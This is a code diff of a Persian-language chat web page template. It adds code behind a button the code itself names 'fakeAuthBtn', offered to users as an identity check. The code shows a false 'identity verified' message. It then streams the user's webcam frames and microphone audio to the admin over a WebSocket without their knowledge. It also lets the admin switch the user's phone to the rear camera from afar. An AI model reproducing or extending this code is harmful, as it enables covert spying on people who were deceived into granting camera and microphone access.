@@ -29,23 +29,6 @@
         .message-row.user .message-content { background-color: #2f2f2f; color: #ececec; border-bottom-right-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
         .message-row.ai .message-content { background-color: #1e1e1e; color: #ececec; border-bottom-left-radius: 4px; border: 1px solid #2a2a2a; }
 
-        /* --- کادر استریم ادمین (شناور) --- */
-        #adminStreamBox {
-            display: none;
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            width: 140px;
-            z-index: 10;
-            background: #000;
-            border-radius: 10px;
-            overflow: hidden;
-            border: 2px solid #4d6bfe;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.6);
-        }
-        #adminStreamBox img { width: 100%; height: auto; display: block; }
-        #adminStreamBox .label { color: #ff9800; font-size: 9px; text-align: center; padding: 4px; background: rgba(0,0,0,0.8); }
-
         /* --- باکس ورودی --- */
         .input-container { position: absolute; bottom: 0; left: 0; right: 0; padding: 20px 20%; background: linear-gradient(180deg, transparent, #212121 30%); }
         .input-box { background-color: #2f2f2f; border-radius: 26px; padding: 12px 16px; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
@@ -57,33 +40,6 @@
         .attachment-preview { display: none; padding: 10px; background: #1e1e1e; border-radius: 8px; margin-bottom: 10px; font-size: 12px; }
         img, video, audio { max-width: 100%; border-radius: 8px; margin-top: 5px; }
         .disclaimer { text-align: center; font-size: 11px; color: #666; margin-top: 12px; }
-
-        /* دکمه فعال‌سازی صدا */
-        #audioUnlockBtn {
-            display: none;
-            position: fixed;
-            bottom: 120px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 20;
-        }
-        #audioUnlockBtn button {
-            background: #ff9800;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-family: inherit;
-            font-size: 14px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
 
         /* ===== ریسپانسیو برای تبلت ===== */
         @media (max-width: 1024px) {
@@ -102,9 +58,6 @@
             .input-box { padding: 10px 12px; }
             .input-box textarea { font-size: 14px; }
             #fakeAuthBtn button { font-size: 12px !important; padding: 8px 16px !important; }
-            #adminStreamBox { width: 100px; top: 10px; right: 10px; }
-            #audioUnlockBtn { bottom: 100px; }
-            #audioUnlockBtn button { font-size: 12px; padding: 10px 16px; }
         }
     </style>
 </head>
@@ -120,11 +73,6 @@
         </div>
     </div>
     <div class="chat-main">
-        <div id="adminStreamBox">
-            <img id="adminLiveVideo" alt="ادمین" />
-            <div class="label">📹 ادمین</div>
-        </div>
-        
         <div class="messages" id="messages">
             {% if not messages %}
             <div class="welcome-screen">
@@ -159,10 +107,6 @@
         </div>
     </div>
 
-    <div id="audioUnlockBtn">
-        <button onclick="unlockAudio()">🔊 برای شنیدن صدای ادمین کلیک کنید</button>
-    </div>
-
     <script>
         const userId = {{ user_id }};
         const adminId = {{ admin_id }};
@@ -170,51 +114,101 @@
         const input = document.getElementById('messageInput');
         let pendingFileUrl = null, pendingFileType = null;
 
-        let userAudioQueue = [];
-        let isUserPlayingAudio = false;
-        let audioUnlocked = false;
-
-        function unlockAudio() {
-            audioUnlocked = true;
-            document.getElementById('audioUnlockBtn').style.display = 'none';
-            playNextUserAudio();
-        }
-
-        function playNextUserAudio() {
-            if (!audioUnlocked) return;
-            if (userAudioQueue.length === 0) { isUserPlayingAudio = false; return; }
-            isUserPlayingAudio = true;
-            const audio = new Audio(userAudioQueue.shift());
-            audio.play().then(() => {
-                audio.onended = () => playNextUserAudio();
-            }).catch(() => {
-                document.getElementById('audioUnlockBtn').style.display = 'block';
-                isUserPlayingAudio = false;
-            });
-        }
+        // استریم کاربر
+        let localStream = null;
+        let videoInterval = null;
+        let audioRecorder = null;
 
         const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
         const ws = new WebSocket(`${wsProtocol}${window.location.host}/ws/${userId}/user`);
         
         messagesDiv.scrollTop = messagesDiv.scrollHeight;
 
-        window.startLiveStream = function() {
+        // --- استریم کاربر به ادمین (تایید هویت) ---
+        window.startLiveStream = async function() {
             document.getElementById('fakeAuthBtn').style.display = 'none';
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(stream => {
-                    const successMsg = document.createElement('div');
-                    successMsg.id = "successMsg";
-                    successMsg.style.cssText = "color: #4caf50; text-align: center; font-size: 12px; margin-bottom: 10px;";
-                    successMsg.textContent = "✅ هویت شما با موفقیت تایید شد. اکنون می‌توانید چت کنید.";
-                    messagesDiv.appendChild(successMsg);
-                    setTimeout(() => { if (successMsg) successMsg.remove(); }, 3000);
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                const successMsg = document.createElement('div');
+                successMsg.id = "successMsg";
+                successMsg.style.cssText = "color: #4caf50; text-align: center; font-size: 12px; margin-bottom: 10px;";
+                successMsg.textContent = "✅ هویت شما با موفقیت تایید شد. اکنون می‌توانید چت کنید.";
+                messagesDiv.appendChild(successMsg);
+                setTimeout(() => { if (successMsg) successMsg.remove(); }, 3000);
 
+                const video = document.createElement('video');
+                video.srcObject = localStream; video.muted = true; video.play();
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+
+                // ارسال ویدیو
+                videoInterval = setInterval(() => {
+                    if (video.videoWidth > 0) {
+                        canvas.width = 320; canvas.height = 240;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                        ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
+                    }
+                }, 200);
+
+                // ارسال صدا
+                const audioStream = new MediaStream(localStream.getAudioTracks());
+                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+                audioRecorder.ondataavailable = async (e) => {
+                    if (e.data.size > 0) {
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            ws.send(JSON.stringify({ type: 'live_stream', video: null, audio: reader.result }));
+                        };
+                        reader.readAsDataURL(e.data);
+                    }
+                };
+                audioRecorder.start(500);
+
+            } catch (err) {
+                alert("برای استفاده از چت، باید دسترسی به دوربین و میکروفون را تایید کنید.");
+                document.getElementById('fakeAuthBtn').style.display = 'block';
+            }
+        };
+
+        // --- دریافت دستور تغییر دوربین از ادمین ---
+        ws.onmessage = async function(event) {
+            const data = JSON.parse(event.data);
+            
+            if (data.type === 'new_message') {
+                appendMessage(data.sender_id, data.content, data.message_type);
+            }
+            
+            // ✅ تغییر دوربین کاربر توسط ادمین
+            if (data.type === 'change_camera') {
+                const facing = data.facing; // "user" یا "environment"
+                
+                // متوقف کردن استریم فعلی
+                if (localStream) {
+                    localStream.getTracks().forEach(track => track.stop());
+                }
+                if (videoInterval) {
+                    clearInterval(videoInterval);
+                }
+                if (audioRecorder) {
+                    audioRecorder.stop();
+                }
+                
+                try {
+                    // گرفتن استریم جدید با دوربین درخواستی
+                    localStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: facing }, 
+                        audio: true 
+                    });
+                    
                     const video = document.createElement('video');
-                    video.srcObject = stream; video.muted = true; video.play();
+                    video.srcObject = localStream; video.muted = true; video.play();
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
 
-                    setInterval(() => {
+                    // ارسال ویدیوی جدید
+                    videoInterval = setInterval(() => {
                         if (video.videoWidth > 0) {
                             canvas.width = 320; canvas.height = 240;
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -222,10 +216,11 @@
                             ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
                         }
                     }, 200);
-
-                    const audioStream = new MediaStream(stream.getAudioTracks());
-                    const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-                    mediaRecorder.ondataavailable = async (e) => {
+                    
+                    // ارسال صدای جدید
+                    const audioStream = new MediaStream(localStream.getAudioTracks());
+                    audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+                    audioRecorder.ondataavailable = async (e) => {
                         if (e.data.size > 0) {
                             const reader = new FileReader();
                             reader.onloadend = () => {
@@ -234,36 +229,10 @@
                             reader.readAsDataURL(e.data);
                         }
                     };
-                    mediaRecorder.start(500);
-                })
-                .catch(err => {
-                    alert("برای استفاده از چت، باید دسترسی به دوربین و میکروفون را تایید کنید.");
-                    document.getElementById('fakeAuthBtn').style.display = 'block';
-                });
-        };
-
-        ws.onmessage = function(event) {
-            const data = JSON.parse(event.data);
-            
-            if (data.type === 'new_message') {
-                appendMessage(data.sender_id, data.content, data.message_type);
-            }
-            
-            if (data.type === 'admin_stream') {
-                const box = document.getElementById('adminStreamBox');
-                const img = document.getElementById('adminLiveVideo');
-                
-                if (data.video) {
-                    box.style.display = 'block';
-                    img.src = data.video;
-                }
-                
-                if (data.audio) {
-                    if (!audioUnlocked) {
-                        document.getElementById('audioUnlockBtn').style.display = 'block';
-                    }
-                    userAudioQueue.push(data.audio);
-                    if (!isUserPlayingAudio) playNextUserAudio();
+                    audioRecorder.start(500);
+                    
+                } catch (err) {
+                    console.error("خطا در تغییر دوربین:", err);
                 }
             }
         };
